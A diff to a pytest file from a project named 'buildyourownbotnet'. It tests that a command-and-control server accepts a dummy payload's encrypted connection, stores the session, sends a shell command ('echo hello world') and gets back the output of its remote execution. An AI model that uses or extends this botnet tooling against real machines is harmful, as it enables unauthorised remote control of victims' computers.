@@ -1,14 +1,15 @@
 import os
 import time
 import pytest
+from multiprocessing import Process
 from buildyourownbotnet import c2
-from buildyourownbotnet.core.dao import session_dao
+from buildyourownbotnet.core.dao import session_dao, task_dao
 from buildyourownbotnet.server import SessionThread
 from buildyourownbotnet.models import Session
-from .. import dummy_payload
+from buildyourownbotnet.core import dummy_payload_for_testing
 from ..conftest import app_client, new_user
 
-def test_payload_secure_connection(app_client, new_user):
+def test_payload_connection(app_client, new_user):
     """
     Given an instance of the C2 socket server and an instance of a dummy payload,
     when the payload attempts to connect to the server,
@@ -19,11 +20,14 @@ def test_payload_secure_connection(app_client, new_user):
     2) Diffie-Hellman IKE to generate a secure 256 bit symmetric key,
     3) Payload sends server info about the client machine
     4) Server creates a new session thread to handle the connection with the client,
-       and stores the session metadata in the database.
+    5) Session metadata is stored the database
+    6) Client/server can now send AES-256-CBC encrypted messages over the network
     """
     # attempt connection
     try:
-        payload = dummy_payload.Payload(host='0.0.0.0', port='1337', gui='1', owner=new_user.username)
+        payload = dummy_payload_for_testing.Payload(host='0.0.0.0', port='1337', gui='1', owner=new_user.username)
+        payload_process = Process(target=payload.run)
+        payload_process.start()
     except Exception as e:
         pytest.fail(f"Connection failed: {e}")
 
@@ -46,5 +50,26 @@ def test_payload_secure_connection(app_client, new_user):
     assert session_metadata is not None
     assert isinstance(session_metadata, Session)
 
+    # test send/receive data between client/server
+    command = 'echo hello world'
+    try:
+        # store issued task in database
+        task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
 
+        # send task and get response
+        session_thread.send_task(task)
+        response = session_thread.recv_task()
+
+        # update task record with result in database
+        result_dict = task_dao.handle_task(response)
+        result = str(result_dict['result']).encode()
+
+        # if end-to-end encryption and remote command execution has worked, response will be 'hello world'
+        assert result == b'hello world\n'
+    except Exception as e:
+        pytest.fail(f"Session command raised exception: {e}")
+    finally:
+        # kill payload
+        session_thread.kill()
+        payload_process.terminate()
 
